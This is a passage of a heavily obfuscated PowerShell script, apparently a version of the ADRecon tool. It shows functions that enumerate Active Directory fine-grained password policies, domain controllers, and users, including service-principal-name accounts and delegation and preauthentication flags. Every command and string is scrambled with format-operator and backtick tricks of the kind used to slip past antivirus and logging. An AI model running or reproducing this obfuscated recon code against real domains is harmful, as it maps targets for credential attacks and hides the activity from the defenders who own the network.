            ${a`df`INe`P`ASSPOliCy} = &("{5}{0}{1}{6}{2}{4}{3}{7}" -f 'neGr','ained','or','ol','dP','Get-ADFi','Passw','icy') -Filter *
        }
        Catch
        {
            &("{0}{1}{2}" -f'Write','-Wa','rning') ("{11}{16}{7}{6}{24}{25}{22}{5}{14}{18}{12}{21}{20}{8}{1}{3}{15}{13}{17}{4}{0}{2}{9}{19}{23}{10}"-f'e','a','d Pas','ting','rain','dPoli','RFi','et-AD','numer','sword','olicy','[',' wh',' ','cy] Erro',' the Fine','G','G','r',' ','le e','i','wor','P','neG','rainedPass')
            &("{0}{2}{1}"-f 'W','Verbose','rite-') "[EXCEPTION] $($_.Exception.Message) "
            Return ${N`ULl}
        }

        If (${A`dfiNe`p`ASsPoLI`cY})
        {
            ${A`D`pASspOLobj} = @()

            ${ADFINEpa`sS`POL`I`cy} | &("{2}{1}{0}" -f 'ch-Object','Ea','For') {
                For(${i}=0; ${I} -lt $(${_}."apP`LIeS`TO"."cOu`NT"); ${I}++)
                {
                    ${aP`p`liE`stO} = ${App`LI`EsTO} + "," + ${_}."ap`p`LiEStO"[${I}]
                }
                If (${nu`LL} -ne ${aPpL`I`e`sto})
                {
                    ${APp`liE`s`TO} = ${A`p`PlieSTO}.("{2}{0}{1}"-f'rimSta','rt','T').Invoke(",")
                }
                ${oB`J`ValUES} = @(("{0}{1}" -f'N','ame'), $(${_}."N`Ame"), ("{2}{3}{1}{0}"-f'To','lies ','A','pp'), ${ApPL`iES`To}, ("{1}{3}{0}{4}{2}" -f 'word h','Enforce','y',' pass','istor'), ${_}."p`ASSwO`RdH`iStORyC`oUnt", (("{4}{1}{5}{2}{3}{0}"-f')','aximum ','d','ays','M','password age (')), ${_}."ma`xpASS`w`orD`AgE"."dA`ys", ("{4}{2}{3}{0}{1}"-f 'word age (d','ays)','a','ss','Minimum p'), ${_}."Mi`NPA`Ss`w`ORdagE"."Da`YS", ("{2}{4}{5}{3}{1}{0}" -f'ength','word l','M','s','inimum ','pas'), ${_}."M`inPASsw`oRdL`ENgth", ("{8}{10}{0}{9}{2}{7}{11}{5}{1}{3}{6}{4}"-f'o','ty req',' must m','ui','ts','exi','remen','eet com','Pass','rd','w','pl'), ${_}."co`MP`LE`Xit`YENA`BLEd", ("{6}{7}{4}{8}{9}{0}{10}{3}{2}{1}{5}{11}"-f 's',' encry','e','l','sing rev','pt','Store password',' u','e','r','ib','ion'), ${_}."rEvERSIbl`EencrYp`TIONEnA`B`LeD", (("{4}{0}{6}{1}{7}{2}{8}{9}{3}{5}"-f'coun',' loc','ura','ns','Ac',')','t','kout d','tion',' (mi')), ${_}."LoCkO`UtdU`Ra`TIOn"."mIn`U`TEs", ("{2}{1}{6}{5}{0}{3}{4}"-f ' thr','ccount','A','esho','ld','ut',' locko'), ${_}."L`ocKoutthr`E`ShOlD", ("{4}{5}{0}{3}{1}{2}{6}{7}" -f't account','ckout cou','nt',' lo','Re','se','er afte','r (mins)'), ${_}."lO`Ck`ouTO`B`seRVAti`ONWINdOw"."Minu`T`Es", ("{1}{2}{3}{0}"-f 'e','Preced','e','nc'), $(${_}."Pr`Ec`edEnce"))
                For (${I} = 0; ${i} -lt $(${OB`jVAL`UeS}."c`OunT"); ${I}++)
                {
                    ${O`BJ} = &("{2}{0}{1}" -f 'je','ct','New-Ob') ("{0}{1}{2}"-f'PSObj','e','ct')
                    ${o`BJ} | &("{0}{2}{1}"-f'Ad','Member','d-') -MemberType ("{0}{1}{2}{3}"-f'N','ote','P','roperty') -Name ("{0}{1}"-f 'Polic','y') -Value ${obJvaL`U`es}[${I}]
                    ${o`BJ} | &("{2}{3}{1}{0}"-f 'mber','Me','A','dd-') -MemberType ("{0}{3}{1}{2}" -f 'NoteP','t','y','roper') -Name ("{1}{0}"-f'alue','V') -Value ${obj`ValU`es}[${I}+1]
                    ${i}++
                    ${aDPa`s`spo`LoBJ} += ${O`BJ}
                }
            }
            &("{3}{1}{2}{0}" -f'ble','emove','-Varia','R') ("{0}{4}{1}{3}{2}" -f'ADFine','a','cy','sspoli','p')
        }
    }

    If (${M`eT`hod} -eq ("{0}{1}" -f'LD','AP'))
    {
        If (${OBjd`o`MAIN})
        {
            ${oBjsE`AR`cHER} = &("{1}{0}{2}{3}"-f'ew-Obj','N','e','ct') ("{8}{10}{9}{1}{2}{4}{0}{7}{3}{6}{5}" -f 'i','oryS','ervices','r','.D','rcher','ySea','recto','Sys','m.Direct','te') ${ObJD`oM`AIn}
            ${o`BJS`eA`RChEr}."PAgE`S`Ize" = ${pa`G`EsizE}
            ${Ob`JsEARCH`er}."fi`lteR" = (("{8}{2}{1}{0}{5}{6}{3}{7}{4}"-f's=m','ctClas','obje','swordSe','ings)','sDS-Pa','s','tt','('))
            ${OBJ`SearC`h`er}."Se`A`Rc`hSCoPE" = ("{1}{0}"-f 'ree','Subt')
            Try
            {
                ${aDfinep`A`s`sPOLicy} = ${objS`E`ArC`Her}.("{0}{1}{2}" -f 'Fin','d','All').Invoke()
            }
            Catch
            {
                &("{2}{0}{1}" -f 'te-War','ning','Wri') ("{3}{6}{8}{10}{11}{12}{7}{15}{5}{4}{14}{9}{1}{2}{13}{0}{16}" -f'o','rained ','Pass','[Get','enume','hile ','-ADRFineGrained','y] Er','Pass','he Fine G','wor','dPol','ic','word P','rating t','ror w','licy')
                &("{2}{3}{1}{0}"-f'e','bos','W','rite-Ver') "[EXCEPTION] $($_.Exception.Message) "
                Return ${nU`ll}
            }

            If (${aD`F`iNepa`S`spOlicy})
            {
                If ( (  ITeM ('vAR'+'IABl'+'E:D761'+'P')).vaLue::("{1}{0}{2}"-f'jec','Ob','tCount').Invoke(${aD`Fi`NEpaSs`pO`LIcy}) -ge 1)
                {
                    ${a`dP`ASspolobJ} = @()
                    ${adfiN`EP`AssPoL`I`cy} | &("{3}{2}{4}{1}{0}"-f'-Object','Each','o','F','r') {
                    For(${i}=0; ${i} -lt $(${_}."pRO`PERt`ies".'msds-psoappliesto'."CoU`Nt"); ${I}++)
                    {
                        ${ap`p`lIesto} = ${aPP`lIes`TO} + "," + ${_}."pRO`P`E`RTIeS".'msds-psoappliesto'[${i}]
                    }
                    If (${n`UlL} -ne ${APplI`ES`To})
                    {
                        ${ap`P`LIE`Sto} = ${APp`Li`EsTo}.("{1}{0}" -f 'mStart','Tri').Invoke(",")
                    }
                        ${Ob`JVaL`UEs} = @(("{0}{1}" -f 'Nam','e'), $(${_}."p`RO`per`TIeS"."n`AME"), ("{0}{1}{2}" -f'Ap','pli','es To'), ${A`P`PliEsTo}, ("{2}{0}{3}{1}{4}{5}"-f'f','password ','En','orce ','hi','story'), $(${_}."P`ROP`erti`eS".'msds-passwordhistorylength'), (("{0}{3}{4}{5}{2}{1}" -f 'Maxim','ys)','e (da','um passw','ord ','ag')), $($(${_}."pROP`er`TIes".'msds-maximumpasswordage') /-864000000000), ("{5}{7}{1}{2}{8}{4}{0}{6}{3}"-f'e (day','um',' passwor',')',' ag','M','s','inim','d'), $($(${_}."PROpErt`I`es".'msds-minimumpasswordage') /-864000000000), ("{2}{5}{1}{4}{0}{6}{3}"-f 'ord ','pass','Mini','ngth','w','mum ','le'), $(${_}."p`R`OpeRTi`eS".'msds-minimumpasswordlength'), ("{4}{2}{7}{3}{6}{8}{1}{10}{9}{0}{5}"-f 'e','ty re','d m','p','Passwor','ments','le','ust meet com','xi','ir','qu'), $(${_}."p`R`OpertiEs".'msds-passwordcomplexityenabled'), ("{11}{6}{0}{1}{5}{7}{3}{2}{8}{10}{4}{9}"-f 'sword',' us','en','sible ','p','ing rev','re pas','er','cr','tion','y','Sto'), $(${_}."PRo`Pe`RTIES".'msds-passwordreversibleencryptionenabled'), ("{1}{5}{0}{3}{2}{4}{6}{8}{7}" -f 'ount lo','Ac','out dur','ck','ati','c','on (mi','s)','n'), $($(${_}."p`ROPE`RtIEs".'msds-lockoutduration')/-600000000), ("{4}{2}{5}{0}{1}{3}"-f 'loc','k','unt','out threshold','Acco',' '), $(${_}."P`R`opertiES".'msds-lockoutthreshold'), (("{5}{2}{10}{9}{7}{1}{3}{8}{6}{0}{4}" -f'in','out ','t','counter af','s)','Rese','er (m','lock','t','account ',' ')), $($(${_}."pr`operT`IEs".'msds-lockoutobservationwindow')/-600000000), ("{2}{0}{3}{1}"-f 'ed','e','Prec','enc'), $(${_}."pR`Op`ERtieS".'msds-passwordsettingsprecedence'))
                        For (${i} = 0; ${I} -lt $(${ObJV`ALu`es}."cou`Nt"); ${I}++)
                        {
                            ${O`BJ} = &("{3}{2}{0}{1}" -f'w-Objec','t','e','N') ("{1}{2}{0}"-f 'ect','PS','Obj')
                            ${O`BJ} | &("{0}{1}{2}"-f 'Add','-Memb','er') -MemberType ("{1}{2}{3}{0}"-f 'rty','Not','eProp','e') -Name ("{0}{1}"-f 'P','olicy') -Value ${o`BJv`ALuEs}[${I}]
                            ${O`Bj} | &("{2}{0}{1}" -f'Membe','r','Add-') -MemberType ("{0}{1}{2}" -f 'No','tePr','operty') -Name ("{0}{1}" -f 'Val','ue') -Value ${Ob`jV`A`LueS}[${I}+1]
                            ${i}++
                            ${A`dpA`S`SPoLoBj} += ${O`Bj}
                        }
                    }
                }
                &("{1}{2}{0}"-f'e','Remove-Variab','l') ("{3}{1}{0}{2}" -f'asspo','ep','licy','ADFin')
            }
        }
    }

    If (${aDpAsspO`LO`Bj})
    {
        Return ${adPAsS`pO`loBj}
    }
    Else
    {
        Return ${NU`LL}
    }
}

Function g`Et-`A`dRDo`maiNCOntrOLl`Er
{

    param(
        [Parameter(manDAtORY = ${t`RUE})]
        [string] ${me`Th`Od},

        [Parameter(ManDAtOry = ${F`ALse})]
        [DirectoryServices.DirectoryEntry] ${O`BjDO`ma`IN},

        [Parameter(MAndaToRy = ${F`A`Lse})]
        [Management.Automation.PSCredential] ${Cre`DE`NTiAL} =  $nk5P::"eMp`Ty"
    )

    If (${met`h`od} -eq ("{1}{0}"-f 'DWS','A'))
    {
        Try
        {
            ${A`d`Do`Mai`NControLL`e`RS} = @( &("{6}{4}{3}{2}{1}{0}{5}" -f 'e','Controll','n','ai','ADDom','r','Get-') -Filter * )
        }
        Catch
        {
            &("{1}{3}{2}{0}"-f'ning','W','-War','rite') ("{13}{20}{5}{1}{8}{0}{12}{14}{9}{10}{17}{4}{11}{15}{19}{6}{16}{2}{7}{18}{3}{21}"-f 'i','m','C','Obj','rror ','ADRDo','ng ','o','a','ol','l','while enum','nCon','[','tr','er','Domain','er] E','ntroller ','ati','Get-','ects')
            &("{3}{1}{0}{4}{2}" -f 'e','rit','erbose','W','-V') "[EXCEPTION] $($_.Exception.Message) "
            Return ${n`UlL}
        }

        
        If (${A`DdO`MaiNCO`NtrO`L`lers})
        {
            &("{2}{3}{1}{0}"-f'erbose','V','Writ','e-') "[*] Total Domain Controllers: $([ADRecon.ADWSClass]::ObjectCount($ADDomainControllers)) "
            ${D`c`OBJ} =   (VariAblE iT3v9e).VALuE::("{0}{2}{4}{1}{3}"-f 'Domain','rPars','Controll','er','e').Invoke(${a`DDoMa`inCOn`T`R`OL`lERs}, ${THR`ea`ds})
            &("{3}{1}{2}{4}{0}"-f'le','ove-V','aria','Rem','b') ("{3}{2}{4}{0}{5}{1}" -f'mainC','lers','D','AD','o','ontrol')
        }
    }

    If (${ME`T`Hod} -eq ("{1}{0}"-f'P','LDA'))
    {
        If (${cr`eD`en`TiAl} -ne  $Nk5p::"eMP`Ty")
        {
            ${D`OmA`InFqdN} = &("{0}{1}{2}"-f'G','et-DNto','FQDN')(${O`B`JDOmAiN}."distIN`guIShEd`Na`ME")
            ${DOm`A`IncoNTe`xt} = &("{2}{1}{0}" -f 'ct','e','New-Obj') ("{5}{8}{7}{4}{2}{0}{3}{6}{14}{10}{1}{11}{9}{13}{12}" -f'irec','.Acti','m.D','tor','e','S','ySe','st','y','irectory.DirectoryC','s','veD','text','on','rvice')(("{1}{2}{0}" -f'in','D','oma'),$(${dOma`I`N`FqDN}),$(${Cred`e`NtIal}."u`s`ernAMe"),$(${c`R`EDe`NtIAL}.("{0}{5}{3}{4}{2}{1}"-f 'Get','dential','kCre','etw','or','N').Invoke()."p`AS`sWORd"))
            Try
            {
                ${adD`om`Ain} =   (  chilDItEm vaRIaBle:lbfuD2 ).VaLUE::("{1}{2}{0}" -f 'omain','Ge','tD').Invoke(${D`omaiNcOn`T`EXt})
            }
            Catch
            {
                &("{2}{0}{1}"-f 'ri','te-Warning','W') ("{11}{6}{3}{10}{13}{5}{14}{1}{9}{7}{12}{4}{0}{2}{8}" -f' ','ror gett','Con','o','n',']','-ADRD','m','text','ing Do','mainContr','[Get','ai','oller',' Er')
                &("{3}{0}{1}{2}"-f 'ite-','Ver','bose','Wr') "[EXCEPTION] $($_.Exception.Message) "
                Return ${nU`lL}
            }
            &("{2}{0}{3}{1}"-f'ove-Va','iable','Rem','r') ("{0}{2}{1}"-f'Doma','nContext','i')
        }
        Else
        {
            ${Add`oMaIn} =  $LbfUd2::("{0}{2}{4}{1}{3}"-f'GetCurren','om','t','ain','D').Invoke()
        }

        If (${a`Ddo`M`AIN}."D`oMAI`NCoNt`RO`LLE`RS")
        {
            &("{0}{2}{1}" -f'Writ','bose','e-Ver') "[*] Total Domain Controllers: $([ADRecon.LDAPClass]::ObjectCount($ADDomain.DomainControllers)) "
            ${dC`ObJ} =   (vAriablE ('D7'+'61P') -Valu )::("{0}{6}{2}{4}{1}{3}{5}" -f 'D','rPar','n','s','Controlle','er','omai').Invoke(${aD`dOMa`in}."D`oma`INcoNTr`o`LLERS", ${THr`eAdS})
            &("{0}{3}{1}{2}{4}" -f'R','r','iab','emove-Va','le') ("{0}{1}"-f 'ADDom','ain')
        }
    }

    If (${d`CoBj})
    {
        Return ${d`CobJ}
    }
    Else
    {
        Return ${N`UlL}
    }
}

Function GE`T-aD`RUsEr
{

    param(
        [Parameter(maNDatOrY = ${T`Rue})]
        [string] ${me`TH`oD},

        [Parameter(MANDatOrY = ${TR`Ue})]
        [DateTime] ${d`AtE},

        [Parameter(mAnDaTORy = ${fAl`Se})]
        [DirectoryServices.DirectoryEntry] ${o`B`jdoma`IN},

        [Parameter(mAnDaToRY = ${t`RUe})]
        [int] ${D`ORM`ANTTiM`E`sPAn} = 90,

        [Parameter(MAnDAtory = ${T`RUe})]
        [int] ${p`AGEsiZE},

        [Parameter(maNdaToRy = ${faL`sE})]
        [int] ${T`hrE`AdS} = 10,

        [Parameter(MandATORY = ${fa`L`Se})]
        [int] ${a`D`RUSE`RS} = ${Tr`UE},

        [Parameter(mAndatORy = ${F`AL`Se})]
        [int] ${ad`RuS`ersPnS} = ${F`AL`SE}
    )

    If (${Me`ThOd} -eq ("{1}{0}"-f 'S','ADW'))
    {
        If (!${AdR`UseRs})
        {
            Try
            {
                ${AdUS`e`RS} = @( &("{0}{1}{2}" -f'Get','-ADObje','ct') -LDAPFilter ((("{3}{7}{6}{1}{4}{8}{9}{11}{5}{10}{2}{0}" -f'))','Type=805306368)(s','*','(&(s','ervi','e','ccount','amA','c','ePrincipalN','=','am'))) -ResultPageSize ${PAg`e`SIzE} -Properties ("{1}{0}" -f'e','Nam'),("{2}{1}{0}"-f 'n','tio','Descrip'),("{1}{0}" -f 'erOf','memb'),("{2}{1}{3}{4}{0}"-f'Name','cc','sAMA','o','unt'),("{2}{5}{4}{0}{1}{3}" -f'Principal','N','s','ame','ce','ervi'),("{3}{0}{1}{2}{4}"-f'r','y','Gro','prima','upID'),("{2}{1}{0}"-f 't','astSe','pwdL'),("{3}{2}{0}{1}"-f't','Control','Accoun','user') )
            }
            Catch
            {
                &("{1}{0}{3}{2}"-f 'W','Write-','g','arnin') ("{3}{8}{6}{12}{5}{1}{9}{14}{7}{2}{10}{0}{11}{13}{4}" -f 'e','i','t','[','ts','h','er] ',' enumera','Get-ADRUs','l','ing Us','rSPN','Error w',' Objec','e')
                &("{1}{0}{2}{3}"-f 't','Wri','e-','Verbose') "[EXCEPTION] $($_.Exception.Message) "
                Return ${nu`lL}
            }
        }
        Else
        {
            Try
            {
                ${AduS`E`Rs} = @( &("{2}{0}{1}"-f'A','DUser','Get-') -Filter * -ResultPageSize ${pAgE`s`Ize} -Properties ("{3}{1}{0}{2}" -f 'rationDa','tExpi','te','Accoun'),("{3}{4}{2}{1}{0}" -f 's','pire','tEx','acc','oun'),("{0}{2}{3}{1}{4}" -f'Ac','eleg','countN','otD','ated'),("{2}{3}{0}{1}"-f'oun','t','Admin','C'),("{0}{4}{1}{5}{3}{2}"-f'AllowReversib','Pas','ordEncryption','w','le','s'),('c'),("{1}{2}{3}{4}{5}{0}"-f 'Password','C','ann','otChan','g','e'),("{2}{3}{0}{1}"-f'am','e','Canonic','alN'),("{0}{1}" -f 'Compan','y'),("{0}{3}{1}{2}" -f 'Depar','e','nt','tm'),("{0}{2}{1}" -f 'Descript','on','i'),("{1}{0}{3}{4}{2}"-f 'is','D','me','tinguis','hedNa'),("{4}{1}{0}{2}{3}"-f'Requi','oesNot','rePreAut','h','D'),("{2}{0}{1}"-f'bl','ed','Ena'),("{2}{0}{1}"-f'enNa','me','giv'),("{3}{2}{0}{1}" -f 'eDi','rectory','om','h'),("{0}{1}" -f 'Inf','o'),("{2}{3}{0}{1}" -f 'ogon','Date','Las','tL'),("{2}{1}{0}{3}"-f 'e','ogonTim','lastL','stamp'),("{1}{0}"-f 'ut','LockedO'),("{0}{4}{2}{5}{3}{1}"-f 'Logo','tions','r','ta','nWo','ks'),("{0}{1}" -f'mai','l'),("{2}{0}{1}"-f'nage','r','Ma'),("{0}{1}{2}" -f'mem','ber','Of'),("{2}{1}{0}{3}"-f 'ddleNa','i','m','me'),("{1}{0}"-f'e','mobil'),("{0}{4}{3}{2}{5}{1}" -f 'msDS-AllowedToD','eTo','g','le','e','at'),("{2}{0}{1}{4}{7}{6}{3}{5}"-f's','DS','m','ptionTy','-Suppor','pes','Encry','ted'),("{1}{0}" -f'ame','N'),("{1}{2}{0}" -f'xpired','Pa','sswordE'),("{3}{2}{1}{0}" -f't','stSe','swordLa','Pas'),("{6}{0}{4}{1}{2}{5}{3}"-f'assw','e','rE','pires','ordNev','x','P'),("{3}{2}{0}{1}{4}"-f'o','rdNotRe','w','Pass','quired'),("{4}{3}{0}{2}{1}"-f 'r','D','oupI','yG','primar'),("{2}{1}{0}{3}"-f 'lePat','i','prof','h'),("{1}{0}{2}"-f's','pwdla','tset'),("{1}{2}{0}" -f 'untName','SamA','cco'),("{2}{1}{0}"-f'h','iptPat','Scr'),("{1}{4}{3}{0}{2}"-f'Na','se','me','icePrincipal','rv'),("{0}{1}"-f'S','ID'),("{0}{2}{1}" -f'SIDHisto','y','r'),("{4}{1}{0}{2}{3}" -f'eq','onR','uir','ed','SmartcardLog'),('sn'),("{1}{0}"-f 'e','Titl'),("{3}{2}{5}{0}{4}{1}"-f 'lega','n','uste','Tr','tio','dForDe'),("{3}{4}{1}{2}{0}"-f 'legation','rD','e','Trust','edToAuthFo'),("{2}{0}{1}"-f's','eDESKeyOnly','U'),("{4}{1}{5}{0}{2}{3}"-f'ntCo','co','n','trol','UserAc','u'),("{3}{0}{2}{1}" -f'he','Changed','n','w'),("{2}{0}{1}{3}" -f 'nC','r','whe','eated') )
            }
            Catch
            {
                &("{1}{0}{2}" -f 'W','Write-','arning') ("{5}{1}{3}{7}{6}{4}{2}{8}{0}"-f 'ser Objects','et-','erating','AD','num','[G',' Error while e','RUser]',' U')
                &("{2}{3}{1}{4}{0}"-f 'e','e','Write','-V','rbos') "[EXCEPTION] $($_.Exception.Message) "
                Return ${Nu`LL}
            }
        }
        If (${Adus`e`Rs})
        {
            &("{1}{2}{3}{0}" -f'se','Wri','te-Ver','bo') "[*] Total Users: $([ADRecon.ADWSClass]::ObjectCount($ADUsers)) "
            If (${A`DRu`SerS})
            {
                Try
                {
                    ${a`d`P`ASspOlicY} = &("{5}{9}{3}{1}{8}{10}{6}{2}{7}{0}{4}"-f'l','ul','d','efa','icy','Get-AD','r','Po','tDom','D','ainPasswo')
                    ${pAS`SM`Ax`AgE} = ${adpaSs`P`oLI`Cy}."max`PAs`sWorDA`GE"."DA`YS"
                    &("{4}{0}{1}{2}{3}"-f'e-V','a','ria','ble','Remov') ("{0}{3}{1}{2}" -f 'ADp','spolic','y','as')
                }
                Catch
                {
                    &("{2}{1}{0}" -f 'Warning','e-','Writ') ("{19}{15}{12}{5}{14}{11}{4}{13}{0}{1}{20}{17}{6}{9}{21}{7}{8}{10}{3}{2}{16}{18}"-f ' ','A',' da','ue as 90','a','r] Error retrieving Ma',' Password Po','y. ','Usi','li','ng val',' P','DRUse','ssword','x','t-A','y','he Default','s','[Ge','ge from t','c')
                    &("{1}{2}{0}{3}" -f'e','W','rite-V','rbose') "[EXCEPTION] $($_.Exception.Message) "
                    ${paS`sma`xage} = 90
                }
                ${uSEro`BJ} =  (vARIabLe  ('It3'+'v'+'9E')  -vA )::("{1}{0}{2}" -f 'rPar','Use','ser').Invoke(${A`DU`SerS}, ${d`ATE}, ${d`o`RmANTtImES`paN}, ${P`A`s`SMAXagE}, ${th`READs})
            }
            If (${a`dR`US`eRSPNS})
            {
                ${u`SE`RspN`oBj} =   $IT3V9E::("{1}{0}{2}" -f'NP','UserSP','arser').Invoke(${A`dUS`ErS}, ${thR`Ea`dS})
            }
            &("{0}{1}{3}{2}" -f'Remove-','V','able','ari') ("{0}{1}"-f 'A','DUsers')
        }
    }

    If (${M`E`ThOD} -eq ("{1}{0}" -f'DAP','L'))
    {
        If (!${A`dru`se`RS})
        {
            ${o`BJ`Se`ARchEr} = &("{2}{1}{0}"-f'ct','ew-Obje','N') ("{7}{3}{4}{9}{10}{0}{11}{8}{2}{1}{6}{5}" -f 'toryS','ryS','recto','ste','m','rcher','ea','Sy','es.Di','.Dir','ec','ervic') ${O`BjDO`mAIN}
            ${O`BJsear`c`hEr}."pA`GE`SIZE" = ${PA`G`eSize}
            ${o`B`JSeaR`cheR}."f`IL`TER" = ("{1}{8}{3}{7}{2}{4}{5}{0}{6}" -f 'ipalNam','(&(s','tType=80530636','mAccou','8',')(servicePrinc','e=*))','n','a')
            ${OBjsE`A`RchER}."pR`OPE`Rt`IE`stoload".("{0}{2}{1}" -f'AddR','nge','a').Invoke((("{1}{0}"-f 'e','nam'),("{1}{2}{0}" -f 'iption','de','scr'),("{1}{2}{0}" -f 'of','memb','er'),("{0}{3}{1}{2}" -f'sa','m','e','maccountna'),("{1}{4}{0}{5}{3}{2}"-f'ri','se','me','palna','rvicep','nci'),("{3}{4}{2}{1}{0}"-f 'pid','rou','g','pri','mary'),("{2}{1}{0}" -f 't','dlastse','pw'),("{0}{1}{2}{3}"-f'us','e','ra','ccountcontrol')))
            ${O`BJs`eA`RcHER}."SEARCH`sC`O`pe" = ("{0}{1}"-f 'Subtr','ee')
            Try
            {
                ${A`d`USERs} = ${OBj`SE`ARCh`er}.("{2}{0}{1}" -f 'dAl','l','Fin').Invoke()
            }
            Catch
            {
                &("{3}{1}{2}{0}"-f'ng','ite-','Warni','Wr') ("{0}{4}{7}{1}{2}{3}{6}{8}{5}" -f '[','hile enum','erating Use','r','Get-ADRUser] ','cts','SPN O','Error w','bje')
                &("{0}{1}{2}{3}"-f'Writ','e-Verb','os','e') "[EXCEPTION] $($_.Exception.Message) "
                Return ${NU`lL}
            }
            ${ObJ`S`e`ARCheR}.("{2}{1}{0}"-f 'e','os','disp').Invoke()
        }
        Else
        {
            ${O`B`jSEa`RCHER} = &("{1}{2}{0}"-f'w-Object','N','e') ("{5}{0}{3}{2}{4}{6}{8}{1}{7}"-f 'ys','rectorySearch','rySe','tem.Directo','rvi','S','ces.D','er','i') ${obj`Do`MaiN}
            ${oB`j`SEaR`CHer}."pag`E`SizE" = ${p`A`Ge`sIze}
            ${obJs`e`A`RchEr}."fi`L`TEr" = (("{4}{3}{1}{2}{0}"-f')','Type=80','5306368','samAccount','('))
            
            ${oB`J`SearCH`ER}."SE`C`UrIT`yMasks" = [System.DirectoryServices.SecurityMasks]("{0}{1}"-f'Dac','l')
            ${oBJ`SeArc`heR}."p`ROpE`RT`ieS`T`OLOaD".("{0}{1}{2}"-f 'Add','Ra','nge').Invoke((("{0}{1}{2}{3}" -f 'acco','unt','Expir','es'),("{1}{0}{2}"-f'ou','adminc','nt'),"c",("{3}{2}{1}{0}" -f'ame','ln','a','canonic'),("{0}{1}" -f 'comp','any'),("{0}{1}{2}" -f'dep','artmen','t'),("{2}{3}{0}{1}"-f 'iptio','n','des','cr'),("{3}{0}{5}{1}{2}{4}" -f 'sting','s','hed','di','name','ui'),("{1}{0}{2}"-f 'en','giv','Name'),("{3}{1}{0}{2}" -f 're','medi','ctory','ho'),("{1}{0}" -f'o','inf'),("{0}{1}{3}{2}{4}"-f'la','stLog','tim','on','estamp'),("{1}{0}" -f 'l','mai'),("{2}{0}{1}" -f'ag','er','man'),("{2}{0}{1}" -f 'r','of','membe'),("{0}{1}{2}" -f'midd','leN','ame'),("{0}{1}"-f 'mobi','le'),("{3}{1}{4}{0}{2}" -f 'legat','DS-Allowed','eTo','ms','ToDe'),("{7}{3}{4}{5}{1}{0}{2}{6}" -f 'ypt','portedEncr','ionType','DS-','S','up','s','ms'),("{1}{0}" -f'ame','n'),("{3}{1}{2}{0}"-f'criptor','yd','es','ntsecurit'),("{0}{2}{1}"-f'obje','id','cts'),("{3}{0}{1}{2}"-f'up','i','d','primarygro'),("{1}{2}{0}" -f'lepath','prof','i'),("{1}{0}{2}"-f 'wdL','p','astSet'),("{0}{1}{2}{3}" -f'sam','acc','ountN','ame'),("{0}{1}{2}"-f 'scr','iptpat','h'),("{2}{0}{1}{3}"-f 'r','viceprincipalna','se','me'),("{0}{1}{2}"-f'sidh','ist','ory'),"sn",("{0}{1}" -f 'titl','e'),("{5}{1}{3}{4}{2}{0}" -f'ol','acc','tr','ountco','n','user'),("{1}{5}{4}{0}{2}{3}"-f'workst','u','ation','s','r','se'),("{1}{2}{0}" -f'anged','w','hench'),("{1}{2}{0}"-f'd','whencre','ate')))
            ${ObJse`A`RChEr}."sE`ArCHsC`Ope" = ("{0}{1}{2}" -f 'Subt','r','ee')
            Try
            {
                ${a`d`USeRs} = ${oB`j`sEa`RCHEr}.("{0}{1}" -f'Fi','ndAll').Invoke()
            }
            Catch
            {
                &("{0}{2}{1}" -f'Writ','g','e-Warnin') ("{4}{11}{8}{2}{1}{9}{10}{3}{7}{0}{12}{6}{5}"-f 'umerating User','s','U','hi','[Ge','s','bject','le en','ADR','er] ','Error w','t-',' O')
                &("{3}{4}{1}{0}{2}"-f'os','b','e','W','rite-Ver') "[EXCEPTION] $($_.Exception.Message) "
                Return ${n`UlL}
            }
            ${ob`JS`eARChER}.("{0}{1}{2}"-f 'd','i','spose').Invoke()
        }
        If (${AduS`E`Rs})
        {
            &("{1}{2}{0}" -f'ose','Write-','Verb') "[*] Total Users: $([ADRecon.LDAPClass]::ObjectCount($ADUsers)) "
            If (${Ad`R`U`serS})
            {
                ${pAsS`Max`Age} = $(${o`BJdOmA`IN}.("{3}{0}{5}{1}{4}{7}{2}{6}"-f'e','argeInt','oIn','Conv','ege','rtL','t64','rT').Invoke(${Objd`OMa`in}."Maxpwd`A`GE"."val`UE") /-864000000000)
                If (-Not ${pas`s`max`Age})
                {
                    &("{0}{1}{2}"-f 'W','rite-Warn','ing') ("{5}{9}{20}{19}{4}{12}{7}{18}{8}{1}{6}{15}{10}{13}{2}{0}{17}{3}{11}{16}{14}"-f'swor','g','Pas',' Polic','] Error r','[Get','e fro','evin','d A','-AD',' Defau','y. Using va','etri','lt ','s','m the','lue as 90 day','d','g Max Passwor','er','RUs')
                    &("{1}{3}{0}{2}" -f'bo','Wri','se','te-Ver') "[EXCEPTION] $($_.Exception.Message) "
                    ${PAs`SmA`xaGE} = 90
                }
                ${USe`R`OBJ} =   ( dir ('VaRiAb'+'Le'+':d7'+'61P')).vALUE::("{2}{0}{1}"-f'e','r','UserPars').Invoke(${adUse`Rs}, ${da`TE}, ${dOrman`TT`imE`SpAn}, ${pASSMAX`A`ge}, ${tHREa`dS})
            }
            If (${Ad`RUSER`s`pNs})
            {
                ${USER`sPno`BJ} =  $d761p::("{4}{0}{3}{2}{1}" -f'rS','r','e','PNPars','Use').Invoke(${ADuS`ErS}, ${Th`READS})
            }
            &("{0}{3}{4}{1}{2}" -f'Remove','i','able','-','Var') ("{0}{1}"-f'ADU','sers')
        }
    }

    If (${U`serObj})
    {
        &("{2}{1}{0}" -f 't-ADR','por','Ex') -ADRObj ${u`se`ROBj} -ADROutputDir ${ad`R`ouTPuTd`IR} -OutputType ${Ou`TPuTT`y`PE} -ADRModuleName ("{0}{1}" -f 'U','sers')
        &("{3}{4}{1}{0}{2}" -f 'a','ari','ble','Remo','ve-V') ("{2}{0}{1}" -f 'b','j','UserO')
    }
    If (${USe`Rs`PnObj})
    {
        &("{0}{1}{2}" -f 'Expo','r','t-ADR') -ADRObj ${UsER`Sp`NObJ} -ADROutputDir ${ADR`OUt`PuTDiR} -OutputType ${ou`TpuT`T`YPe} -ADRModuleName ("{0}{1}"-f'UserS','PNs')
        &("{3}{0}{1}{2}"-f 'v','e-','Variable','Remo') ("{3}{2}{0}{1}"-f'NO','bj','P','UserS')
    }
}


Function Ge`T-AdrPasSW`orDa`TtRI`BuT`Es
{

    param(
        [Parameter(mANdATOry = ${TR`UE})]
        [string] ${M`EtH`OD},

        [Parameter(MaNdatORY = ${F`A`lsE})]
        [DirectoryServices.DirectoryEntry] ${o`B`Jdomain},

        [Parameter(MaNdATOrY = ${TR`Ue})]
        [int] ${pAg`ES`izE}
    )

    If (${m`etHoD} -eq ("{1}{0}"-f'S','ADW'))
    {
        Try
        {
